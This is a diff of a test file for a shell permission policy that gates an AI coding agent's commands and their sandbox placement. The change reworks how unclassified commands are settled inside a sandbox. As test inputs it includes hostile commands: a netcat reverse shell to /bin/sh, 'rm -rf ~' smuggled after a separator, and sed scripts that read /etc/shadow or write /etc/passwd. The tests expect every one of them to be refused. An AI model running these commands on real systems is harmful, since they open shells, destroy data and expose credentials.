@@ -51,18 +51,17 @@ from lup.policy.bundle import (
 from lup.policy.kernel.decision import (
     DecisionEffect,
     KernelDecision,
-    SANDBOX_ESCALATION_OFFER,
-    SANDBOX_ESCALATION_UNSUPPORTED,
     SANDBOX_TRAPPED_REASON,
     SandboxPlacement,
-    escalation_offer,
     sandbox_escaped,
 )
 from lup.policy.kernel.edit import decide_edit
-from lup.policy.kernel.rows import PathRoleRow
+from lup.policy.kernel.rows import PathRoleRow, ShellRuleRow, shell_row_values
 from lup.policy.refused_tools import RefusedTool, erase_refused_tools
 from lup.policy.edit_rules import EditRule
 from lup.policy.shell_rules import (
+    ShellCommandRule,
+    erase_shell_rules,
     RunnerTargetRule,
     ShellOperationRule,
     ShellSubcommandRule,
@@ -908,14 +907,15 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="nc localhost 8000", effect="deny"),
     DecisionCase(input="nc -l -p 4444", effect="deny"),
     DecisionCase(input="nc -z -e /bin/sh host 22", effect="deny"),
-    # Sandboxed executions: machinery bail-outs defer to the OS boundary,
-    # judged decisions hold, and escalation still promotes to a question.
+    # Contained executions: what nobody classified is settled inside rather
+    # than handed to the session's own mode, judged decisions hold, and
+    # escalation still promotes to a question.
     DecisionCase(input="frobnicate --weird", effect="ask"),
-    DecisionCase(input="frobnicate --weird", effect="defer", sandboxed=True),
-    DecisionCase(input="sed --frob 's/a/b/' f", effect="defer", sandboxed=True),
-    DecisionCase(input="sort $UNBOUND f", effect="defer", sandboxed=True),
-    DecisionCase(input="foo() { cat x; }", effect="defer", sandboxed=True),
-    DecisionCase(input="case $m in a) echo a;;", effect="defer", sandboxed=True),
+    DecisionCase(input="frobnicate --weird", effect="allow", sandboxed=True),
+    DecisionCase(input="sed --frob 's/a/b/' f", effect="allow", sandboxed=True),
+    DecisionCase(input="sort $UNBOUND f", effect="allow", sandboxed=True),
+    DecisionCase(input="foo() { cat x; }", effect="allow", sandboxed=True),
+    DecisionCase(input="case $m in a) echo a;;", effect="allow", sandboxed=True),
     DecisionCase(
         input="git push --delete origin feat",
         effect="ask",
@@ -926,15 +926,19 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="ssh-add -D", effect="deny", sandboxed=True),
     DecisionCase(input="frobnicate; ssh host", effect="ask", sandboxed=True),
     DecisionCase(input="python -c 'x'", effect="deny", sandboxed=True),
-    # An excluded command runs with no OS boundary beneath it, so unjudged
-    # work in it has nothing to defer to and returns to the lattice, whose
-    # floor for a command listed nowhere is the reviewer — including when it
-    # rides in beside a command the boundary would confine.
+    # An excluded command runs with no boundary beneath it, so unjudged work
+    # in it has nothing to be settled inside and returns to the lattice,
+    # whose floor for a command listed nowhere is the reviewer — including
+    # when it rides in beside a command the boundary would confine. A name
+    # the exclusion prefix does not actually match is confined like any
+    # other, which is what keeps the exclusion from widening on a substring.
     DecisionCase(input="quuxify --weird", effect="ask", sandboxed=True),
     DecisionCase(input="frobnicate; quuxify now", effect="ask", sandboxed=True),
-    DecisionCase(input="quuxifyer --weird", effect="defer", sandboxed=True),
-    # The toolchain declares its escape, so nothing carries a flag to reach it:
-    # unconfined it simply runs, and where a call can be placed it is placed.
+    DecisionCase(input="quuxifyer --weird", effect="allow", sandboxed=True),
+    # The toolchain needs paths the boundary grants rather than the launcher's
+    # host, so it runs where the session runs under every posture. What it
+    # actually requires is a boundary declaration, measured at launch, and a
+    # profile that cannot meet it says so there rather than per call.
     DecisionCase(input="uv run lup-devtools dev check", effect="allow"),
     DecisionCase(
         input="uv run lup-devtools dev check",
@@ -942,11 +946,10 @@ SHELL_POLICY_CASES = [
         sandboxed=True,
         escapable=True,
     ),
-    # Confined with nowhere to put the call, the declaration cannot be honoured,
-    # so it is stopped with the reason rather than run where it will die on the
-    # first write. The same holds for anything else declared outside.
-    DecisionCase(input="uv run lup-devtools dev check", effect="deny", sandboxed=True),
-    DecisionCase(input="git push --delete origin feat", effect="deny", sandboxed=True),
+    DecisionCase(input="uv run lup-devtools dev check", effect="allow", sandboxed=True),
+    # A judged question is not answered by the boundary: containment is what
+    # settles work nobody looked at, and somebody looked at this one.
+    DecisionCase(input="git push --delete origin feat", effect="ask", sandboxed=True),
     DecisionCase(input="uv run pytest tests/unit", effect="allow", sandboxed=True),
     # A help probe only prints usage, so it reads an unclassified command
     # without judging it. Bare -h counts alone; carrying a value it is an
@@ -956,32 +959,31 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="git push --help", effect="allow"),
     DecisionCase(input="frobnicate -h", effect="allow"),
     DecisionCase(input="mysql -h db.example.com", effect="ask"),
-    # A non-interactive host cannot put a question to a human: sandboxed, an
-    # ask rides the OS boundary; unsandboxed it fails closed. A judged deny
-    # is never rescued, and unjudged work defers exactly as it always did.
+    # A session that can reach no reviewer has no question to put, so the ask
+    # becomes the same abstention every gap reaches: contained it is settled
+    # inside, uncontained it is refused. What it is not is a deferral to the
+    # session's own mode, which would make the outcome of an unanswerable
+    # question depend on how permissively the session happened to be started.
     DecisionCase(
         input="git push --delete origin feat", effect="deny", interactive=False
     ),
     DecisionCase(
         input="git push --delete origin feat",
-        effect="defer",
+        effect="allow",
         sandboxed=True,
         escapable=True,
         interactive=False,
     ),
-    # A placement nothing can carry out outranks that boundary either way:
-    # deferring means the OS confines the call, which is the one answer a
-    # command declared outside cannot take.
     DecisionCase(
         input="git push --delete origin feat",
-        effect="deny",
+        effect="allow",
         sandboxed=True,
         interactive=False,
     ),
     DecisionCase(input="PYTHONPATH=src uv run pytest", effect="ask"),
     DecisionCase(
         input="PYTHONPATH=src uv run pytest",
-        effect="defer",
+        effect="allow",
         sandboxed=True,
         interactive=False,
     ),
@@ -989,22 +991,23 @@ SHELL_POLICY_CASES = [
         input="sed -i 's/a/b/' f", effect="deny", sandboxed=True, interactive=False
     ),
     DecisionCase(
-        input="frobnicate --weird", effect="defer", sandboxed=True, interactive=False
+        input="frobnicate --weird", effect="allow", sandboxed=True, interactive=False
     ),
     # The classic sourcing bypasses are declared refusals rather than gaps,
     # so they hold inside a boundary too: confining code nothing read does
-    # not read it, which is the answer `python -c` already gave. A deferring
-    # segment among allows keeps the batch deferred.
+    # not read it, which is the answer `python -c` already gave. An
+    # unclassified segment among allows keeps the batch unclassified, which
+    # contained is settled inside and uncontained reaches a reviewer.
     DecisionCase(input="eval echo x", effect="deny"),
     DecisionCase(input="source setup.sh", effect="deny"),
     DecisionCase(input=". ./env.sh", effect="deny"),
     DecisionCase(input="eval echo x", effect="deny", sandboxed=True),
     DecisionCase(input="source setup.sh", effect="deny", sandboxed=True),
-    DecisionCase(input="frobnicate; ls", effect="defer", sandboxed=True),
+    DecisionCase(input="frobnicate; ls", effect="allow", sandboxed=True),
     DecisionCase(input="echo $(whoami)", effect="allow", sandboxed=True),
     DecisionCase(input="echo $(frobnicate)", effect="ask"),
-    DecisionCase(input="echo $(frobnicate)", effect="defer", sandboxed=True),
-    DecisionCase(input="git log $(cat names.txt)", effect="defer", sandboxed=True),
+    DecisionCase(input="echo $(frobnicate)", effect="allow", sandboxed=True),
+    DecisionCase(input="git log $(cat names.txt)", effect="allow", sandboxed=True),
     DecisionCase(input="echo `id`", effect="deny", sandboxed=True),
     DecisionCase(
         input="# lup: escalate: unknown tool\nfrobnicate",
@@ -1603,10 +1606,13 @@ def test_native_decision_renderers_preserve_or_fail_closed_on_ask() -> None:
 
 
 def test_the_decision_effect_stays_closed_at_four_members() -> None:
-    """Escaping the sandbox is the other axis, never a fifth effect.
+    """Where an operation runs is the other axis, never a fifth effect.
 
-    A member per placement would need an ask-plus-escape next and then a
-    deny-plus-escape, so the two questions stay two fields.
+    A member per placement would need an ask-plus-elsewhere next and then
+    a deny-plus-elsewhere, so the two questions stay two fields. Three
+    placements rather than four: what a rule used to spell ``escalable``
+    is a request the agent writes and a reviewer answers, which is not a
+    place an operation can be.
     """
     assert sorted(get_args(DecisionEffect.__value__)) == [
         "allow",
@@ -1616,7 +1622,6 @@ def test_the_decision_effect_stays_closed_at_four_members() -> None:
     ]
     assert sorted(get_args(SandboxPlacement.__value__)) == [
         "ambient",
-        "escalable",
         "inside",
         "outside",
     ]
@@ -1628,8 +1633,9 @@ def test_the_settled_sandbox_composition_rows_render_as_decided() -> None:
 
     The placement is an argument of the call on Claude Code, so an allow that
     escapes is an allow plus a rewrite; an ask that escapes is asking two
-    things at once, so the reason says both. The two escalable pairs answer on
-    a second channel as well, and are pinned where that offer is.
+    things at once, so the reason says both — and what it says is the host,
+    because a placement that named only a native sandbox could be honoured
+    by a session that never left the container it was really about.
     """
     shell: JsonObject = {"command": "git ls-remote origin HEAD"}
     render = ClaudeDecisionRenderer().render
@@ -1643,7 +1649,9 @@ def test_the_settled_sandbox_composition_rows_render_as_decided() -> None:
     escaped = render(Decision(effect="allow", sandbox="outside"), shell)
 
     assert asked.permission_decision == "ask"
-    assert asked.reason == "needs a human — this will run outside the sandbox"
+    assert asked.reason == (
+        "needs a human — this will run on the host, outside the boundary"
+    )
     assert asked.updated_input == {**shell, "dangerouslyDisableSandbox": True}
     assert (denied.permission_decision, denied.updated_input) == ("deny", None)
     assert confined.updated_input == {**shell, "dangerouslyDisableSandbox": False}
@@ -1663,8 +1671,8 @@ def test_a_deny_short_circuits_whatever_the_sandbox_says() -> None:
     )
     assert KernelDecision("defer", "unjudged", "outside").sandbox == "ambient"
 
-    refused = KernelDecision("deny", "refused", "escalable")
-    placed = refused.placed(escapable=True, agent_escalates=True)
+    refused = KernelDecision("deny", "refused", "outside")
+    placed = refused.placed(escapable=True)
     assert (refused.sandbox, placed.reason) == ("ambient", "refused")
 
 
@@ -1682,64 +1690,36 @@ def test_a_runtime_that_cannot_place_a_call_renders_the_plain_effect() -> None:
 
     assert codex.render(escaped).exit_code == 0
     assert "outside the sandbox" not in codex.render(asked).stderr
-    assert escaped.placed(escapable=False, agent_escalates=True) == Decision(
-        effect="allow", reason="fine"
-    )
+    assert escaped.placed(escapable=False) == Decision(effect="allow", reason="fine")
 
 
-def test_a_permission_to_escalate_turns_on_the_agent_and_not_on_the_channel() -> None:
-    """The offer is addressed to the agent, so it is the agent that decides it.
+def test_which_placements_leave_is_one_answer_two_renderers_cannot_differ() -> None:
+    """Four boundaries render the crossing, so the condition is written once.
 
-    Which is why it survives on a runtime whose verdicts place nothing: the
-    middle case here is Codex, where a hook rewrites no call — so no placement
-    reaches the wire — while the agent still has words for taking its own call
-    out, and the reason carries them. Reading that case off the placement
-    channel is what would drop an offer the agent could have spent.
-
-    Where the agent has no way out the call runs confined, and says so as
-    ``inside`` rather than as the session-deferring placement: withdrawing an
-    offer is not the same act as handing the question back to the session,
-    and on an unconfined session the two differ by the whole sandbox. The
-    reason says the offer is not available, because an agent that spends a
-    turn discovering that learns nothing it can act on.
+    Both hook factories, the in-process renderer, and each compiled dispatcher
+    fill the same field. A condition spelled at four sites is one that can be
+    spelled differently at four sites, which is how a placement came to be
+    honoured on one path and stripped on the other.
     """
-    offered = Decision(effect="allow", reason="fine", sandbox="escalable")
-
-    placed = offered.placed(escapable=True, agent_escalates=True)
-    carried = offered.placed(escapable=False, agent_escalates=True)
-    degraded = offered.placed(escapable=True, agent_escalates=False)
-
-    assert (placed.sandbox, placed.reason) == (
-        "escalable",
-        "fine" + SANDBOX_ESCALATION_OFFER,
-    )
-    assert (carried.sandbox, carried.reason) == (
-        "ambient",
-        "fine" + SANDBOX_ESCALATION_OFFER,
-    )
-    assert (degraded.sandbox, degraded.effect) == ("inside", "allow")
-    assert degraded.reason == "fine" + SANDBOX_ESCALATION_UNSUPPORTED
-    assert CodexDecisionRenderer(supports_ask=False).render(offered).exit_code == 0
+    assert sandbox_escaped("outside") is True
+    assert sandbox_escaped("inside") is False
+    assert sandbox_escaped("ambient") is False
 
 
-def test_only_an_escalable_placement_reads_what_the_call_already_asked() -> None:
-    """Which placements leave is one answer, so two renderers cannot differ.
+def test_a_placement_lup_states_is_not_the_call_asking_for_itself() -> None:
+    """A native flag the agent set is a fact, never a request Lup honours.
 
-    ``outside`` leaves and ``inside`` stays whatever the call said, because
-    those are the verdict's to decide. Only ``escalable`` reads the second
-    argument, which is what makes it a permission the agent spends rather
-    than a placement done to it.
+    Asking for the launcher's host is a marker a reviewer answers. A call that
+    set the provider's own escape flag has said something narrower and only
+    ever tightening — it will not be confined by that sandbox — so an
+    ``inside`` placement overwrites it rather than reading it as consent.
     """
-    for spent in (True, False):
-        assert sandbox_escaped("outside", spent) is True
-        assert sandbox_escaped("inside", spent) is False
-        assert sandbox_escaped("escalable", spent) is spent
+    held = Decision(effect="allow", reason="fine", sandbox="inside")
+    asked_out: JsonObject = {"command": "x", "dangerouslyDisableSandbox": True}
 
+    rendered = ClaudeDecisionRenderer().render(held, asked_out)
 
-def test_an_escalation_offer_only_reaches_a_tool_that_can_spend_it() -> None:
-    """A permission is not an offer when the tool has no escape field."""
-    assert escalation_offer("escalable", "fine", spendable=True) == "fine"
-    assert escalation_offer("escalable", "fine", spendable=False) == ""
+    assert rendered.updated_input == {**asked_out, "dangerouslyDisableSandbox": False}
 
 
 def test_fetch_policy_normalizes_origin_and_rejects_lookalikes() -> None:
@@ -1994,17 +1974,16 @@ def test_a_runner_target_a_project_refuses_is_refused_with_its_own_reason(
     assert "print the exact command" in refused.reason
 
     # The case this exists to separate itself from. Undeclared reaches no
-    # judgment: unsandboxed that converts to a deny naming the escalation
-    # recipe, and confined it stays a defer — the policy emits no decision at
-    # all and the runtime's own permissions settle it. Neither is the
-    # project's refusal, and the confined one is not a refusal by this policy
-    # at any setting, which is why the table has to be able to say so itself.
+    # judgment: uncontained it reaches the reviewer, and contained it runs
+    # inside the boundary, where everything it can affect is disposable.
+    # Neither is the project's refusal, and the contained one is not a
+    # refusal at any setting, which is why the table has to say so itself.
     confined = ShellPolicy(SHELL_RULES, runner_targets=targets, sandbox_active=True)
 
     def confined_effect(command: str) -> str:
         return confined.decide(ShellCommand(command=command, cwd=tmp_path)).effect
 
-    assert confined_effect("uv run something-else") == "defer"
+    assert confined_effect("uv run something-else") == "allow"
     assert confined_effect("uv run forecast 'will it rain'") == "deny"
 
 
@@ -2277,16 +2256,18 @@ def test_creating_a_file_passes_where_overwriting_one_still_asks(
 
 
 def test_sandbox_escape_reenters_the_lattice_the_boundary_was_answering() -> None:
-    """Leaving the sandbox puts the call back where nothing carries it.
+    """Leaving the boundary puts the operation back where nothing carries it.
 
-    Confined, the boundary answers for what nobody classified. Escaped, the
-    lattice returns — and its floor for a command the vocabulary merely does
-    not list is the reviewer, not a refusal. A command the kernel could not
-    *read* still lands on the refusal, which is what the second half pins.
+    Confined, Lup settles what nobody classified to a permission held
+    inside — a permission rather than a handoff, so the placement is Lup's
+    and holds however permissive the session's own mode is. Escaped, that
+    fact is gone, and the floor for a command the vocabulary merely does
+    not list is the reviewer rather than a refusal. A command the kernel
+    could not *read* still lands on the refusal, which the second half pins.
     """
     policy = ShellPolicy(SHELL_RULES, sandbox_active=True)
     confined = policy.decide(ShellCommand(command="frobnicate --weird"))
-    assert confined.effect == "defer"
+    assert (confined.effect, confined.sandbox) == ("allow", "inside")
     escaped = policy.decide(
         ShellCommand(command="frobnicate --weird", unsandboxed=True)
     )
@@ -2299,58 +2280,53 @@ def test_sandbox_escape_reenters_the_lattice_the_boundary_was_answering() -> Non
     assert "escalate" in unreadable.reason
 
 
-def test_the_toolchain_carries_its_own_escape_and_is_refused_without_one() -> None:
-    """The declaration is the escape, and where nothing can carry it, the stop.
+def test_an_operation_the_profile_cannot_place_is_refused_by_capability() -> None:
+    """A placement no channel carries is a missing capability, not a verdict.
 
-    Confined with nowhere to put the call, the toolchain would reach the shell
-    and die on whatever it wrote first — a bare read-only-filesystem error an
-    agent reads as a broken repository rather than as a boundary, so it
-    retries, works around it, or reports success from a session that never ran
-    a command. Naming the sandbox costs one turn instead.
+    Run inside instead, the operation would die on whatever it touched
+    first — a bare read-only-filesystem error an agent reads as a broken
+    repository rather than as a boundary, so it retries, works around it,
+    or reports success from a session that never ran a command. Refused,
+    it costs one turn and names the channel the profile does not have,
+    which is what nobody could approve into existence.
     """
-    command = ShellCommand(command="uv run lup-devtools harness resolve")
+    command = ShellCommand(command="hostonly --run")
+    rules = [
+        ShellCommandRule(name="hostonly", default_effect="allow", sandbox="outside")
+    ]
 
-    placed = ShellPolicy(
-        SHELL_RULES,
-        sandbox_active=True,
-        escapable=True,
-        runner_targets=FIXTURE_RUNNER_TARGETS,
-    ).decide(command)
-    assert placed.effect == "allow"
-    assert placed.sandbox == "outside"
+    placed = ShellPolicy(rules, sandbox_active=True, escapable=True).decide(command)
+    assert (placed.effect, placed.sandbox) == ("allow", "outside")
 
-    trapped = ShellPolicy(
-        SHELL_RULES,
-        sandbox_active=True,
-        runner_targets=FIXTURE_RUNNER_TARGETS,
-    ).decide(command)
+    trapped = ShellPolicy(rules, sandbox_active=True).decide(command)
     assert trapped.effect == "deny"
     assert trapped.reason == SANDBOX_TRAPPED_REASON
-    assert "native sandbox escalation" in trapped.reason
-    assert "only a runtime without that channel" in trapped.reason
+    assert trapped.cause == "capability"
+    assert trapped.capability == "host_executor"
 
 
 def test_a_help_probe_keeps_the_placement_its_target_declares() -> None:
     """Printing usage is a verdict about the effect and not about the place.
 
-    The toolchain above is declared ``outside`` because it opens agent
-    sessions, and asking it for its own usage is the same program under the
-    same declaration. Answered above the walk the probe returned a bare
-    allow, and the placement went with it: `uv run lup-devtools dev check`
-    was placed ``outside`` while `uv run lup-devtools --help`, one word
-    apart, was placed ``ambient`` — as was every other help probe in the
-    vocabulary, whatever its depth. So the probe now replaces the effect and
-    the walk still answers for the placement.
+    Asking a target for its own usage is the same program under the same
+    declaration, so it keeps that declaration's placement. Answered above
+    the walk the probe returned a bare allow and the placement went with
+    it: one target was placed by its own row while the same target's help
+    probe, one word apart, fell to ``ambient`` — as did every other help
+    probe in the vocabulary, whatever its depth. So the probe replaces the
+    effect and the walk still answers for the placement.
     """
+    targets = [RunnerTargetRule(name="placed-tool", sandbox="inside")]
+
     placed = ShellPolicy(
         SHELL_RULES,
         sandbox_active=True,
         escapable=True,
-        runner_targets=FIXTURE_RUNNER_TARGETS,
-    ).decide(ShellCommand(command="uv run lup-devtools --help"))
+        runner_targets=targets,
+    ).decide(ShellCommand(command="uv run placed-tool --help"))
 
     assert placed.effect == "allow"
-    assert placed.sandbox == "outside"
+    assert placed.sandbox == "inside"
 
 
 def test_a_help_probe_of_an_unclassified_command_still_reads() -> None:
@@ -2387,19 +2363,27 @@ def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
 def test_a_reviewed_worker_is_told_the_route_it_actually_has() -> None:
     """Non-interactive and alone are different states that shared one answer.
 
-    A worker holds a question mailbox reaching the human supervising its run,
-    so telling it to reshape the command names the only route it has as
-    unavailable — and measured in #202, it did what anybody would and queued a
-    *material question* instead, parking the whole run on a decision nobody
-    needed to make. A genuinely headless run still gets the reshape, because
-    naming a route that is not there is the same failure pointed the other way.
+    A worker holds a question mailbox reaching the human supervising its
+    run, so a guarded verb parks a durable question there rather than being
+    refused — measured in #202, a refusal that named no route sent it to
+    queue a *material question* instead, parking the whole run on a decision
+    nobody needed to make. A genuinely headless run has no such channel, so
+    the same verb is refused and told to reshape, because naming a route
+    that is not there is the same failure pointed the other way.
     """
-    relayed = ShellPolicy(SHELL_RULES, interactive=False, relayed=True).decide(
-        ShellCommand(command="git push --delete origin feat")
+    guarded = ShellCommand(command="git push --delete origin feat")
+    relayed = ShellPolicy(SHELL_RULES, interactive=False, relayed=True).decide(guarded)
+    alone = ShellPolicy(SHELL_RULES, interactive=False).decide(guarded)
+
+    assert relayed.effect == "ask"
+    assert alone.effect == "deny"
+    assert "reshape the command" in alone.reason
+    assert (
+        "request_allowance"
+        in ShellPolicy(SHELL_RULES, interactive=False, relayed=True)
+        .decide(ShellCommand(command="cat x ;& rm -rf ~"))
+        .reason
     )
-    assert relayed.effect == "deny"
-    assert "request_allowance" in relayed.reason
-    assert "escalate" not in relayed.reason
 
 
 def test_claude_decoder_marks_unsandboxed_escapes() -> None:
@@ -3926,3 +3910,19 @@ def test_an_in_place_rewrite_is_still_screened_for_what_the_script_does(
     assert effect("sed -i 's/a/b/w /etc/passwd' notes.md") != "allow"
     assert effect("sed -i '1e cat /etc/shadow' notes.md") != "allow"
     assert effect("sed -i -f script.sed notes.md") == "deny"
+
+
+def test_every_shell_row_field_reaches_the_generated_data_file() -> None:
+    """A column the erasure produces and the renderer drops is a silent gap.
+
+    The generated dispatcher indexes these keys inside a hook, where a missing
+    key is a permission that never happens — the one failure shape this
+    repository cannot afford to discover in production. So the mapping the
+    renderer walks is checked against the shape's own annotations rather than
+    trusted to have been updated alongside it.
+    """
+    row = erase_shell_rules([ShellCommandRule(name="example", default_effect="allow")])[
+        0
+    ]
+
+    assert set(shell_row_values(row)) == set(ShellRuleRow.__annotations__)
